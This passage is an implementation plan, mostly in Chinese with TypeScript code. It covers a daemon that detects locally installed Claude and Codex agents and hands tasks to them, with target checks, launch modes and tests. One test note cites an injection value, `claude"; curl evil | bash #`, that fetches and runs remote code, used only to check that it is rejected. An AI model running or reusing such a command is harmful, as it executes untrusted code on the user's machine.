# Local Daemon Bridge — Slice 1.5（Agent 检测 + hand-off 收件人选择）Implementation Plan

> **For agentic workers:** REQUIRED SUB-SKILL: Use superpowers:subagent-driven-development (recommended) or superpowers:executing-plans to implement this plan task-by-task. Steps use checkbox (`- [ ]`) syntax for tracking.

**Goal:** daemon 检测本机已装的 Agent 产品（Claude app / claude CLI / codex CLI），hand-off 时用户在授权卡上选收件人（LLM 不传 target），并新增 app 直开 launch 模式。

**Architecture:** daemon 内静态候选表 + 按需检测（`Bun.which` / app 存在性）→ 新桥方法 `list_agents`（capability 纯增量）→ 扩展工具流改为「取列表 → 卡上选 + 授权一步 → 带选中 id 调 handoff」。daemon 侧 target 硬闸泛化为「∈ 本次现检测 id 集」；launch 分 terminal（既有 osascript 路径）/ app（`open -a Claude <dir>` + 目录内 `CLAUDE.md` 约定）两模式。

**Tech Stack:** Bun（daemon，`bun test`）、Chrome MV3 SW + React 19（扩展，vitest + happy-dom）、TypeScript。

**Spec:** `docs/specs/2026-07-05-local-daemon-bridge.md` §4.3（Slice 1.5 增补已合入 spec）。

## Global Constraints

（每个 task 的要求都隐含本节；reviewer 按此逐条对照。）

1. **静态表是唯一 launch 权威**：spawn 的命令（`claude`/`codex`）、app 名（`Claude`）只存在于 daemon 的静态候选表里，**绝不来自 wire 或 LLM 参数**。wire 上只传 agent id，daemon 用 id 查表。
2. **target 硬闸**：每次 handoff **现检测**（不信任 list 时刻的旧结果）；`params.target ∈ 检测到的 id 集`（旧 wire 值 `"claude"` 是 `claude-terminal` 的 alias）；guard 必须在任何写盘/spawn **之前**执行，拒绝时零副作用。
3. **工具签名无 target**：LLM 不能选收件人；用户在 HandoffCard 上选（选择与授权合一步）。检测列表为空 → 工具直接返回结构化错误，**不弹卡**。
4. **协议纯增量**：`PROTOCOL_VERSION` 保持 `1`；`list_agents` 只是新 capability + 新 method。旧 daemon（无 `list_agents`）→ 扩展降级为单项列表 `[{ id: "claude", label: "Claude Code (Terminal)" }]`；旧扩展（发 `target:"claude"`）→ 新 daemon 经 alias 兼容。
5. **候选表顺序即卡片预选顺序**：`claude-app` → `claude-terminal` → `codex-terminal`（app 优先：无 shell、无 TCC，launch 最稳）。卡片预选检测列表第一项。
6. **保留文件名**：`RESERVED` 大小写不敏感（APFS/HFS+），Slice 1.5 起含 `claude.md`（app 模式落盘的 `CLAUDE.md` 不许被用户文件覆盖）。
7. **首批只做三条**：`claude-app` / `claude-terminal` / `codex-terminal`。Hermes/Openclaw 等待用户提供 CLI 命令后再加——**绝不凭空编 spawn 命令**。
8. **i18n 零新 key**：卡片复用现有 `handoff.targetLabel`；agent label 是产品名（"Claude Code (App)" 等），不翻译、不进字典。6 字典 parity 测试不许挂。
9. **daemon 测试 hermetic**：所有 I/O（which/exists/spawn/写盘/建目录）经注入 harness，不碰真实文件系统/进程。
10. **macOS-only**（与 Slice 0/1 相同；检测路径 `/Applications/Claude.app` 写死）。
11. 收尾跑 `pnpm test`、`pnpm typecheck`、`pnpm build` 与 `cd daemon && bun test` 全绿。

## File Structure

- Create: `daemon/src/agents.ts` — 静态候选表 + `detectAgents()`（唯一 launch 权威源）
- Create: `daemon/test/agents.test.ts`
- Modify: `src/types/local-bridge.ts` — capability/method 加 `list_agents`；`HandoffParams.target: string`；`HandoffResult.mode`；`ListAgentsResult`
- Modify: `daemon/src/daemon.ts` — `case "list_agents"`
- Modify: `daemon/test/daemon.test.ts` — list_agents 测试
- Modify: `daemon/src/handoff.ts` — target 闸泛化 + 双 launch 模式
- Modify: `daemon/test/handoff.test.ts` — harness 注入 detect + 新模式测试
- Modify: `src/background/local-bridge.ts` — `requestListAgents()`（含旧 daemon 降级）
- Modify: `src/background/local-bridge.test.ts`
- Modify: `src/lib/panel-request.ts` — `handoff-to-agent` kind 的 req/res 变形
- Modify: `src/lib/agent/tools/handoff.ts` — 工具流：列表→选择→执行；mode-aware observation
- Modify: `src/lib/agent/tools/handoff.test.ts`
- Modify: `src/lib/agent/loop.ts` — 装配处补 `listAgents` dep
- Modify: `src/sidepanel/components/HandoffCard.tsx` — 收件人 radio 列表
- Modify: `src/sidepanel/components/HandoffCard.test.tsx`
- Modify: `src/sidepanel/components/Chat.tsx` — payload/decision 类型接线

---

### Task 1: daemon Agent 注册表 + 检测

**Files:**
- Create: `daemon/src/agents.ts`
- Test: `daemon/test/agents.test.ts`

**Interfaces:**
- Produces: `AgentCandidate`（`{ id, label, kind, bin?, appPath?, appName? }`）、`AGENT_CANDIDATES`（顺序 = 预选顺序）、`detectAgents(opts?: DetectOpts): AgentCandidate[]`。Task 2 的 `list_agents` 和 Task 3 的 handoff 闸都消费它。

- [ ] **Step 1: 写失败测试**

`daemon/test/agents.test.ts`：

```ts
import { test, expect } from "bun:test";
import { AGENT_CANDIDATES, detectAgents } from "../src/agents";

test("candidate table: exactly three first-batch agents, app first (preselect order)", () => {
  expect(AGENT_CANDIDATES.map((c) => c.id)).toEqual(["claude-app", "claude-terminal", "codex-terminal"]);
  // launch 权威字段齐备：terminal 有 bin，app 有 appPath+appName
  for (const c of AGENT_CANDIDATES) {
    if (c.kind === "terminal") expect(c.bin).toBeDefined();
    else {
      expect(c.appPath).toBeDefined();
      expect(c.appName).toBeDefined();
    }
  }
});

test("detectAgents filters by injected which/exists, preserving table order", () => {
  // 只装了 codex CLI + Claude app，没装 claude CLI
  const detected = detectAgents({
    which: (bin) => (bin === "codex" ? "/opt/homebrew/bin/codex" : null),
    exists: (p) => p === "/Applications/Claude.app",
  });
  expect(detected.map((c) => c.id)).toEqual(["claude-app", "codex-terminal"]);
});

test("detectAgents returns empty when nothing installed", () => {
  expect(detectAgents({ which: () => null, exists: () => false })).toEqual([]);
});
```

- [ ] **Step 2: 跑测试确认失败**

Run: `cd daemon && bun test test/agents.test.ts`
Expected: FAIL（模块不存在）

- [ ] **Step 3: 最小实现**

`daemon/src/agents.ts`：

```ts
import { existsSync } from "fs";

/**
 * 静态候选表 = 唯一 launch 权威：spawn 的命令 / app 名只住在这里，绝不来自
 * wire 或 LLM 参数（wire 上只传 id，daemon 用 id 查表）。加新 agent = 加一行；
 * Hermes/Openclaw 等待用户提供真实 CLI 命令后再加——绝不凭空编 spawn 命令。
 * 顺序即 HandoffCard 的预选顺序：app 优先（无 shell、无 TCC，launch 最稳）。
 */
export interface AgentCandidate {
  id: "claude-app" | "claude-terminal" | "codex-terminal";
  label: string;
  kind: "app" | "terminal";
  /** terminal：start.command 里 exec 的命令 */
  bin?: "claude" | "codex";
  /** app：存在性检测路径 */
  appPath?: string;
  /** app：`open -a <appName>` 用的名字 */
  appName?: string;
}

export const AGENT_CANDIDATES: readonly AgentCandidate[] = [
  { id: "claude-app", label: "Claude Code (App)", kind: "app", appPath: "/Applications/Claude.app", appName: "Claude" },
  { id: "claude-terminal", label: "Claude Code (Terminal)", kind: "terminal", bin: "claude" },
  { id: "codex-terminal", label: "Codex (Terminal)", kind: "terminal", bin: "codex" },
];

export interface DetectOpts {
  which?: (bin: string) => string | null;
  exists?: (path: string) => boolean;
}

/** 每次调用现检测（Bun.which / existsSync 都便宜，无缓存必要）；保持表顺序。 */
export function detectAgents(opts?: DetectOpts): AgentCandidate[] {
  const which = opts?.which ?? ((b: string) => Bun.which(b));
  const exists = opts?.exists ?? existsSync;
  return AGENT_CANDIDATES.filter((c) => (c.kind === "app" ? exists(c.appPath!) : which(c.bin!) != null));
}
```

- [ ] **Step 4: 跑测试确认通过**

Run: `cd daemon && bun test test/agents.test.ts`
Expected: PASS（3 tests）

- [ ] **Step 5: Commit**

```bash
git add daemon/src/agents.ts daemon/test/agents.test.ts
git commit -m "feat(daemon): static agent candidate table + detection (claude-app/claude-terminal/codex-terminal)"
```

---

### Task 2: 协议扩展 + daemon `list_agents` 方法

**Files:**
- Modify: `src/types/local-bridge.ts`
- Modify: `daemon/src/daemon.ts`
- Test: `daemon/test/daemon.test.ts`

**Interfaces:**
- Consumes: Task 1 的 `detectAgents`。
- Produces: `BRIDGE_CAPABILITIES` 含 `"list_agents"`；`BridgeRequest.method` 联合含 `"list_agents"`；`ListAgentsResult = { agents: { id: string; label: string }[] }`；`HandoffParams.target: string`；`HandoffResult` 增 `mode: "terminal" | "app"`。Task 3–5 全部消费这些类型。

- [ ] **Step 1: 写失败测试**

在 `daemon/test/daemon.test.ts` 追加：

```ts
test("hello advertises list_agents capability", async () => {
  const out = JSON.parse(
    await handleMessage(
      JSON.stringify({ id: "la0", method: "hello", params: { protocolVersion: PROTOCOL_VERSION } }),
    ),
  );
  expect(out.result.capabilities).toContain("list_agents");
});

test("list_agents returns {id,label}[] (shape only — detection is machine-dependent)", async () => {
  const out = JSON.parse(
    await handleMessage(JSON.stringify({ id: "la1", method: "list_agents", params: {} })),
  );
  expect(out.ok).toBe(true);
  expect(Array.isArray(out.result.agents)).toBe(true);
  for (const a of out.result.agents) {
    expect(typeof a.id).toBe("string");
    expect(typeof a.label).toBe("string");
  }
});
```

- [ ] **Step 2: 跑测试确认失败**

Run: `cd daemon && bun test test/daemon.test.ts`
Expected: FAIL（capability 缺失 / unknown_method）

- [ ] **Step 3: 改协议类型**

`src/types/local-bridge.ts` 四处改动：

```ts
/** daemon 声明它能处理的方法。扩展按此决定装配哪些本地工具。 */
export const BRIDGE_CAPABILITIES = ["run_local_agent", "handoff_to_agent", "list_agents"] as const;
```

```ts
// ── list_agents ──────────────────────────────────────────────────────
/** daemon 静态候选表 ∩ 本机检测（CLI 走 Bun.which，app 走存在性）的结果。 */
export interface ListAgentsResult {
  agents: { id: string; label: string }[];
}
```

`HandoffParams` 的 `target` 字段改为：

```ts
export interface HandoffParams {
  /**
   * agent id（用户在 HandoffCard 上选的，非 LLM 传入）。daemon 运行时校验
   * ∈ 本次检测到的 id 集；旧 wire 值 "claude" 是 claude-terminal 的 alias。
   */
  target: string;
  /** markdown brief，daemon 落盘为 context.md 供交互式 session 读取 */
  context: string;
  /** 可选：随交棒 stage 进 handoff 目录的文件（名字取 basename，防遍历） */
  files?: { name: string; content: string }[];
}
```

`HandoffResult` 改为：

```ts
export interface HandoffResult {
  /** daemon 建的 handoff 目录（回填给侧栏卡片/observation） */
  dir: string;
  /** terminal = 自动开跑；app = Cowork 已打开但需用户发一句话启动 */
  mode: "terminal" | "app";
}
```

`BridgeRequest.method` 联合改为：

```ts
  method: "hello" | "run_local_agent" | "handoff_to_agent" | "list_agents";
```

- [ ] **Step 4: daemon 加 method**

`daemon/src/daemon.ts`：`import { detectAgents } from "./agents";`，在 `switch` 的 `case "handoff_to_agent"` 之后加：

```ts
    case "list_agents":
      return respond({
        ok: true,
        result: { agents: detectAgents().map(({ id, label }) => ({ id, label })) },
      });
```

- [ ] **Step 5: 跑测试确认通过**

Run: `cd daemon && bun test test/daemon.test.ts`
Expected: PASS。注意此时 `daemon/test/handoff.test.ts` 会因 `HandoffResult.mode` / target 泛化**尚未实现**而可能编译失败——那是 Task 3 的对象；本 task 只要求 `daemon.test.ts` 过。若 `bun test` 全量跑挂在 handoff 上，用 `bun test test/daemon.test.ts test/agents.test.ts` 验证本 task 范围。

- [ ] **Step 6: Commit**

```bash
git add src/types/local-bridge.ts daemon/src/daemon.ts daemon/test/daemon.test.ts
git commit -m "feat(bridge): list_agents method + capability; HandoffParams.target generalized to agent id"
```

---

### Task 3: daemon handoff 泛化 —— target 闸 + 双 launch 模式

**Files:**
- Modify: `daemon/src/handoff.ts`
- Test: `daemon/test/handoff.test.ts`

**Interfaces:**
- Consumes: Task 1 `detectAgents`/`AgentCandidate`；Task 2 的 `HandoffParams.target: string`、`HandoffResult.mode`。
- Produces: `runHandoff(params, opts?)` 的 `opts` 增 `detect?: () => AgentCandidate[]`（hermetic 测试注入点）；返回值带 `mode`。

- [ ] **Step 1: 改造现有测试的 harness + 写新失败测试**

`daemon/test/handoff.test.ts` 整体改造。harness 增加 `detect`（默认全部三条候选都"已装"），现有测试里 `target: "claude"` 保持不动（走 alias 路径，这本身就是对旧扩展兼容的持续验证）：

```ts
import { test, expect } from "bun:test";
import { runHandoff, safeFileName } from "../src/handoff";
import { AGENT_CANDIDATES } from "../src/agents";
import { setLogEnabled } from "../src/log";

setLogEnabled(false); // hermetic：不写真实 ~/.pie/logs

function harness() {
  const writes: { path: string; content: string; mode?: number }[] = [];
  const dirs: string[] = [];
  const spawns: { cmd: string; args: string[]; cwd: string }[] = [];
  const opts = {
    ensureDir: (d: string) => { dirs.push(d); },
    writeFile: (p: string, c: string, m?: number) => { writes.push({ path: p, content: c, mode: m }); },
    spawn: async (cmd: string, args: string[], cwd: string) => {
      spawns.push({ cmd, args, cwd });
      return { stdout: "", exitCode: 0 };
    },
    now: () => "2026-07-07",
    detect: () => [...AGENT_CANDIDATES], // 默认三条全"已装"
  };
  return { writes, dirs, spawns, opts };
}
```

现有 6 个测试保留断言语义，改动仅两处：`now` 返回 `"2026-07-07"` 后目录断言同步（`2026-07-07-refactor-the-auth-module`），以及第一个测试补一条 `expect(r.mode).toBe("terminal")`。

新增失败测试：

```ts
test("app mode: writes CLAUDE.md convention, opens Claude app on the dir, no start.command", async () => {
  const h = harness();
  const r = await runHandoff({ target: "claude-app", context: "Continue the report" }, h.opts);
  expect(r.mode).toBe("app");
  // CLAUDE.md 约定注入（app 无 prompt 注入面，靠目录内约定）
  const claudeMd = h.writes.find((w) => w.path.endsWith("/CLAUDE.md"));
  expect(claudeMd?.content).toContain("context.md");
  // context.md 照旧落盘
  expect(h.writes.some((w) => w.path.endsWith("context.md") && w.content === "Continue the report")).toBe(true);
  // app 模式不写 start.command、不走 osascript
  expect(h.writes.some((w) => w.path.endsWith("start.command"))).toBe(false);
  expect(h.spawns).toHaveLength(1);
  expect(h.spawns[0].cmd).toBe("open");
  expect(h.spawns[0].args).toEqual(["-a", "Claude", r.dir]);
});

test("codex terminal mode: start.command execs codex (bin from static table, not wire)", async () => {
  const h = harness();
  const r = await runHandoff({ target: "codex-terminal", context: "x" }, h.opts);
  expect(r.mode).toBe("terminal");
  const cmd = h.writes.find((w) => w.path.endsWith("start.command"));
  expect(cmd?.content).toContain("exec codex ");
  expect(cmd?.content).not.toContain("exec claude ");
});

test("target not in the freshly-detected set is rejected before any side effect", async () => {
  const h = harness();
  h.opts.detect = () => AGENT_CANDIDATES.filter((c) => c.id === "claude-app"); // codex 未装
  await expect(
    runHandoff({ target: "codex-terminal", context: "x" }, h.opts),
  ).rejects.toThrow(/unsupported handoff target/);
  expect(h.writes).toHaveLength(0);
  expect(h.spawns).toHaveLength(0);
});

test("legacy wire target 'claude' aliases to claude-terminal", async () => {
  const h = harness();
  const r = await runHandoff({ target: "claude", context: "x" }, h.opts);
  expect(r.mode).toBe("terminal");
  const cmd = h.writes.find((w) => w.path.endsWith("start.command"));
  expect(cmd?.content).toContain("exec claude ");
});

test("safeFileName rejects CLAUDE.md case-insensitively (app-mode reserved file)", () => {
  expect(() => safeFileName("CLAUDE.md")).toThrow();
  expect(() => safeFileName("claude.md")).toThrow();
});

test("open failure in app mode throws with the dir as manual fallback", async () => {
  const h = harness();
  h.opts.spawn = async (cmd: string, args: string[], cwd: string) => {
    h.spawns.push({ cmd, args, cwd });
    return { stdout: "", exitCode: 1, stderr: "Unable to find application named 'Claude'" };
  };
  await expect(runHandoff({ target: "claude-app", context: "x" }, h.opts)).rejects.toThrow(
    /failed to open[\s\S]*pie-handoffs/,
  );
});
```

注意：原「rejects unsupported/injected target」注入测试（`'claude"; curl evil | bash #'`）保持原断言不动——注入串 alias 后仍不在检测集，走同一条 reject 路径，正好验证泛化后闸没松。

- [ ] **Step 2: 跑测试确认失败**

Run: `cd daemon && bun test test/handoff.test.ts`
Expected: FAIL（`detect` opt 不存在 / `mode` 缺失 / claude-app 未支持）

- [ ] **Step 3: 实现**

`daemon/src/handoff.ts` 改造（保留现有注释块的知识：JSON.stringify/charset 论证、LAUNCH_PAD 机制、TCC 错误指引）：

```ts
import { mkdirSync, writeFileSync } from "fs";
import { join } from "path";
import type { HandoffParams, HandoffResult } from "../../src/types/local-bridge";
import type { SpawnFn } from "./spawn";
import { realSpawn } from "./spawn";
import type { AgentCandidate } from "./agents";
import { detectAgents } from "./agents";
import { paths } from "./paths";
import { log } from "./log";

/** 我们在 handoff 目录里写死的文件名——用户传的文件不许撞它们。 */
const RESERVED = new Set(["context.md", "start.command", "claude.md"]);

/** app 模式的约定注入：Cowork 没有 prompt 参数面，靠目录内 CLAUDE.md 引导。 */
const CLAUDE_MD_CONVENTION =
  "Read context.md in this directory for the handed-off context, then continue the task.\n";
```

（`LAUNCH_PAD`、`slugify`、`safeFileName` 三段原样保留——`safeFileName` 不用改代码，`RESERVED` 加了 `claude.md` 即生效。）

`runHandoff` 改为：

```ts
export async function runHandoff(
  params: HandoffParams,
  opts?: {
    spawn?: SpawnFn;
    ensureDir?: (dir: string) => void;
    writeFile?: (path: string, content: string, mode?: number) => void;
    now?: () => string;
    detect?: () => AgentCandidate[];
  },
): Promise<HandoffResult> {
  const spawn = opts?.spawn ?? realSpawn;
  const ensureDir = opts?.ensureDir ?? ((d) => mkdirSync(d, { recursive: true }));
  const writeFile =
    opts?.writeFile ?? ((p, c, m) => writeFileSync(p, c, m != null ? { mode: m } : undefined));
  const now = opts?.now ?? (() => new Date().toISOString().slice(0, 10));
  const detect = opts?.detect ?? detectAgents;

  // params 是 JSON 解析自 socket 的运行时值（daemon.ts 里只是 `as HandoffParams`
  // 断言，编译期类型在运行时不提供任何保证）。target 决定 spawn 什么：闸 =
  // 「∈ 本次现检测到的 id 集」——launch 命令/app 名全部来自静态候选表，wire 上
  // 的 target 只用来查表，未通过检测的 id（包括注入串）在任何写盘/spawn 之前
  // 被拒。旧 wire 值 "claude"（Slice 1 扩展）alias 到 claude-terminal。
  const requestedId = params.target === "claude" ? "claude-terminal" : params.target;
  const agent = detect().find((a) => a.id === requestedId);
  if (!agent) {
    throw new Error(`unsupported handoff target: ${JSON.stringify(params.target)}`);
  }

  const dir = join(paths.handoffsDir, `${now()}-${slugify(params.context)}`);
  ensureDir(dir);
  writeFile(join(dir, "context.md"), params.context);
  for (const f of params.files ?? []) {
    writeFile(join(dir, safeFileName(f.name)), f.content);
  }

  if (agent.kind === "app") {
    // app 直开（真机已验证）：`open -a Claude <dir>` → Cowork 会话根在该目录。
    // 无 prompt 注入面 → 目录内 CLAUDE.md 约定引导；人到场发一句即开跑。
    // 无 shell、无 TCC，launch 比 Terminal 稳，但不自动开跑（mode 回传给扩展，
    // observation 明示用户需发一句话启动）。
    writeFile(join(dir, "CLAUDE.md"), CLAUDE_MD_CONVENTION);
    log("info", "handoff.open_app", { dir, target: agent.id, files: (params.files ?? []).length });
    const r = await spawn("open", ["-a", agent.appName!, dir], dir);
    if (r.exitCode !== 0) {
      throw new Error(
        `failed to open ${agent.label} (open exit ${r.exitCode}): ${(r.stderr ?? "").trim().slice(0, 300)} — ` +
          `open the folder manually in the app: ${dir}`,
      );
    }
    return { dir, mode: "app" };
  }

  // terminal 模式：交互式会话脚本 + osascript 唤起（机制注释原样保留）
  const script =
    `#!/bin/bash\n` +
    `cd ${JSON.stringify(dir)} || exit 1\n` +
    `exec ${agent.bin} "Read context.md in this directory for the handed-off context, then continue the task."\n`;
  const scriptPath = join(dir, "start.command");
  writeFile(scriptPath, script, 0o755);
  log("info", "handoff.open", { dir, target: agent.id, files: (params.files ?? []).length });
  const padded = `${" ".repeat(LAUNCH_PAD)}exec '${scriptPath}'`;
  const r = await spawn(
    "osascript",
    ["-e", 'tell application "Terminal"', "-e", `do script "${padded}"`, "-e", "activate", "-e", "end tell"],
    dir,
  );
  if (r.exitCode !== 0) {
    throw new Error(
      `failed to open Terminal (osascript exit ${r.exitCode}): ${(r.stderr ?? "").trim().slice(0, 300)} — ` +
        `grant Automation permission for pie → Terminal in System Settings › Privacy & Security › Automation, ` +
        `or run it manually: ${scriptPath}`,
    );
  }
  return { dir, mode: "terminal" };
}
```

原 `exec ${cmd} "..."` 行上方那段「不带 --dangerously-skip-permissions / exec 让 claude 接管终端 / dir charset 论证」的注释块原样保留在 terminal 分支里。

- [ ] **Step 4: 跑测试确认通过**

Run: `cd daemon && bun test`
Expected: PASS（全量，含 agents/daemon/handoff）

- [ ] **Step 5: Commit**

```bash
git add daemon/src/handoff.ts daemon/test/handoff.test.ts
git commit -m "feat(daemon): handoff target gate = freshly-detected id set; app launch mode (open -a + CLAUDE.md convention)"
```

---

### Task 4: 扩展 SW 侧 `requestListAgents` + panel-request kind 变形

**Files:**
- Modify: `src/background/local-bridge.ts`
- Modify: `src/lib/panel-request.ts`
- Test: `src/background/local-bridge.test.ts`

**Interfaces:**
- Consumes: Task 2 的 `ListAgentsResult`。
- Produces: `requestListAgents(): Promise<{ id: string; label: string }[]>`（含旧 daemon 降级）；panel-request kind `"handoff-to-agent"` 变为 `{ req: { context: string; fileCount: number; agents: { id: string; label: string }[] }; res: string | null }`。Task 5/6 消费。

- [ ] **Step 1: 写失败测试**

在 `src/background/local-bridge.test.ts` 追加（沿用文件里现有的 fakePort 模式；`helloReq`/`_emit` 等 helper 与现有 `requestHandoff` 测试相同写法）：

```ts
it("requestListAgents sends list_agents when daemon advertises the capability", async () => {
  initLocalBridge();
  const helloReq = fakePort._sent[0];
  fakePort._emit({
    id: helloReq.id,
    ok: true,
    result: { protocolVersion: PROTOCOL_VERSION, capabilities: ["run_local_agent", "handoff_to_agent", "list_agents"] },
  });
  await Promise.resolve();
  const p = requestListAgents();
  const req = fakePort._sent[1];
  expect(req.method).toBe("list_agents");
  fakePort._emit({ id: req.id, ok: true, result: { agents: [{ id: "claude-app", label: "Claude Code (App)" }] } });
  await expect(p).resolves.toEqual([{ id: "claude-app", label: "Claude Code (App)" }]);
});

it("requestListAgents degrades to single legacy claude entry when capability missing (old daemon)", async () => {
  initLocalBridge();
  const helloReq = fakePort._sent[0];
  fakePort._emit({
    id: helloReq.id,
    ok: true,
    result: { protocolVersion: PROTOCOL_VERSION, capabilities: ["run_local_agent", "handoff_to_agent"] },
  });
  await Promise.resolve();
  await expect(requestListAgents()).resolves.toEqual([{ id: "claude", label: "Claude Code (Terminal)" }]);
  expect(fakePort._sent).toHaveLength(1); // 没有第二个 wire 请求
});
```

- [ ] **Step 2: 跑测试确认失败**

Run: `pnpm test -- src/background/local-bridge.test.ts`
Expected: FAIL（`requestListAgents` 不存在）

- [ ] **Step 3: 实现**

`src/background/local-bridge.ts`：import 处补 `type ListAgentsResult`，在 `requestHandoff` 后加：

```ts
export async function requestListAgents(): Promise<{ id: string; label: string }[]> {
  // 旧 daemon（无 list_agents capability）降级为单项 legacy 列表：id "claude"
  // 是旧 wire 值，新 daemon 侧也保留它作 claude-terminal 的 alias（spec §4.3）。
  if (!capabilities.includes("list_agents")) {
    return [{ id: "claude", label: "Claude Code (Terminal)" }];
  }
  const r = (await send("list_agents", {})) as ListAgentsResult;
  return r.agents;
}
```

`src/lib/panel-request.ts` 的 kind 表改为：

```ts
  "handoff-to-agent": {
    req: { context: string; fileCount: number; agents: { id: string; label: string }[] };
    res: string | null; // 用户选中的 agent id；null = 拒绝
  };
```

- [ ] **Step 4: 跑测试确认通过**

Run: `pnpm test -- src/background/local-bridge.test.ts src/lib/panel-request.test.ts`
Expected: local-bridge PASS。此时 `handoff.test.ts`（工具）/`HandoffCard.test.tsx` 可能 typecheck 报错——那是 Task 5/6 的对象；本 task 范围内两个文件过即可。

- [ ] **Step 5: Commit**

```bash
git add src/background/local-bridge.ts src/background/local-bridge.test.ts src/lib/panel-request.ts
git commit -m "feat(sw): requestListAgents with legacy-daemon fallback; handoff panel-request carries agent list, returns picked id"
```

---

### Task 5: 工具流改造 —— 列表 → 选择 → 执行

**Files:**
- Modify: `src/lib/agent/tools/handoff.ts`
- Modify: `src/lib/agent/loop.ts`（装配处）
- Test: `src/lib/agent/tools/handoff.test.ts`

**Interfaces:**
- Consumes: Task 4 的 `requestListAgents` 与 panel-request res `string | null`；Task 2 的 `HandoffResult.mode`。
- Produces: `HandoffToolDeps = { run; listAgents; requestConsent }`（签名见下）。Task 6 的卡片行为与 `requestConsent` 的 req/res 对齐。

- [ ] **Step 1: 重写失败测试**

`src/lib/agent/tools/handoff.test.ts` 全量替换：

```ts
import { describe, it, expect, vi } from "vitest";
import { buildHandoffTool } from "./handoff";

const AGENTS = [
  { id: "claude-app", label: "Claude Code (App)" },
  { id: "codex-terminal", label: "Codex (Terminal)" },
];

describe("handoff_to_agent tool", () => {
  it("declines: consent null → error, run not called", async () => {
    const run = vi.fn();
    const tool = buildHandoffTool({ run, listAgents: async () => AGENTS, requestConsent: async () => null });
    const r = await tool.handler({ context: "do it" }, {} as never);
    expect(r.success).toBe(false);
    expect(run).not.toHaveBeenCalled();
  });

  it("grants: consent gets the agent list, run called with the picked id", async () => {
    const run = vi.fn(async () => ({ dir: "/Users/x/pie-handoffs/2026-07-07-do-it", mode: "terminal" as const }));
    const consent = vi.fn(async () => "codex-terminal");
    const tool = buildHandoffTool({ run, listAgents: async () => AGENTS, requestConsent: consent });
    const r = await tool.handler({ context: "do it", files: [{ name: "a.md", content: "x" }] }, {} as never);
    expect(consent).toHaveBeenCalledWith({ context: "do it", fileCount: 1, agents: AGENTS });
    expect(run).toHaveBeenCalledWith({ target: "codex-terminal", context: "do it", files: [{ name: "a.md", content: "x" }] });
    expect(r.success).toBe(true);
    expect(r.observation).toContain("/Users/x/pie-handoffs/2026-07-07-do-it");
    expect(r.observation).toContain("Codex (Terminal)");
  });

  it("app mode observation tells the LLM the user must send a message to start", async () => {
    const run = vi.fn(async () => ({ dir: "/Users/x/pie-handoffs/2026-07-07-do-it", mode: "app" as const }));
    const tool = buildHandoffTool({ run, listAgents: async () => AGENTS, requestConsent: async () => "claude-app" });
    const r = await tool.handler({ context: "do it" }, {} as never);
    expect(r.success).toBe(true);
    expect(r.observation).toMatch(/send a message/i);
  });

  it("empty detection: structured error, no consent card, no run", async () => {
    const run = vi.fn();
    const requestConsent = vi.fn();
    const tool = buildHandoffTool({ run, listAgents: async () => [], requestConsent });
    const r = await tool.handler({ context: "do it" }, {} as never);
    expect(r.success).toBe(false);
    expect(r.error).toMatch(/no supported local agents/i);
    expect(requestConsent).not.toHaveBeenCalled();
    expect(run).not.toHaveBeenCalled();
  });

  it("rejects empty context before touching the bridge", async () => {
    const run = vi.fn();
    const listAgents = vi.fn();
    const requestConsent = vi.fn();
    const tool = buildHandoffTool({ run, listAgents, requestConsent });
    const r = await tool.handler({ context: "   " }, {} as never);
    expect(r.success).toBe(false);
    expect(listAgents).not.toHaveBeenCalled();
    expect(requestConsent).not.toHaveBeenCalled();
    expect(run).not.toHaveBeenCalled();
  });
});
```

- [ ] **Step 2: 跑测试确认失败**

Run: `pnpm test -- src/lib/agent/tools/handoff.test.ts`
Expected: FAIL（deps 签名不匹配）

- [ ] **Step 3: 实现**

`src/lib/agent/tools/handoff.ts` 改造：

```ts
import type { Tool, ToolHandlerContext } from "../types";
import type { ActionResult } from "../../dom-actions/types";
import type { HandoffParams, HandoffResult } from "@/types/local-bridge";

export interface HandoffToolDeps {
  run: (p: HandoffParams) => Promise<HandoffResult>;
  /** 桥：本机已检测 agent 列表（旧 daemon 的单项降级在 local-bridge 层做）。 */
  listAgents: () => Promise<{ id: string; label: string }[]>;
  /**
   * HITL 卡：用户选收件人 + 授权一步完成。返回选中的 agent id，null = 拒绝。
   * target 不由 LLM 传——被 untrusted 页面驱动的 LLM 无法诱导选收件人。
   */
  requestConsent: (p: {
    context: string;
    fileCount: number;
    agents: { id: string; label: string }[];
  }) => Promise<string | null>;
}

export function buildHandoffTool(deps: HandoffToolDeps): Tool {
  return {
    name: "handoff_to_agent",
    description:
      "Hand OFF an open-ended, interactive task to a local agent installed on the user's machine " +
      "(e.g. Claude Code, Codex). Unlike run_local_agent (which BLOCKS and returns output), this is " +
      "FIRE-AND-FORGET: it writes your context to context.md, stages any files you provide, and opens " +
      "an interactive session (terminal or app) where the local agent continues the work WITH THE " +
      "HUMAN PRESENT. You do NOT choose the recipient — the user picks it on the authorization card. " +
      "Use for open-ended / collaborative / long-running work that a blocking headless call can't " +
      "handle. You get back ONLY the handoff directory path — results are NOT returned to you. " +
      "Requires user authorization each call.",
    parameters: {
      type: "object",
      properties: {
        context: {
          type: "string",
          description:
            "A markdown brief for the local agent: what was done so far and what to continue. Written to context.md.",
        },
        files: {
          type: "array",
          description: "Optional files to stage into the handoff directory alongside context.md.",
          items: {
            type: "object",
            properties: {
              name: { type: "string", description: "File name (basename only; directories are stripped)." },
              content: { type: "string", description: "File content." },
            },
            required: ["name", "content"],
            additionalProperties: false,
          },
        },
      },
      required: ["context"],
      additionalProperties: false,
    },
    handler: async (args: unknown, _ctx: ToolHandlerContext): Promise<ActionResult> => {
      const a = (args ?? {}) as { context?: unknown; files?: unknown };
      if (typeof a.context !== "string" || a.context.trim() === "") {
        return { success: false, error: "handoff_to_agent: `context` is required (non-empty string)." };
      }
      const files = Array.isArray(a.files)
        ? (a.files as { name: string; content: string }[])
        : undefined;
      const agents = await deps.listAgents();
      if (agents.length === 0) {
        return {
          success: false,
          error:
            "handoff_to_agent: no supported local agents detected on this machine " +
            "(looked for the Claude app and the `claude` / `codex` CLIs).",
        };
      }
      const target = await deps.requestConsent({
        context: a.context,
        fileCount: files?.length ?? 0,
        agents,
      });
      if (target == null) {
        return { success: false, error: "User declined the hand-off." };
      }
      const result = await deps.run({ target, context: a.context, files });
      // fire-and-forget：无 untrusted 内容回传。dir 是 daemon 派生路径（可信），
      // 直接作 trusted observation 让 LLM 转述给用户去接着干。
      const label = agents.find((x) => x.id === target)?.label ?? target;
      const started =
        result.mode === "app"
          ? `The app was opened rooted at that folder; the user must send a message there to start the local agent.`
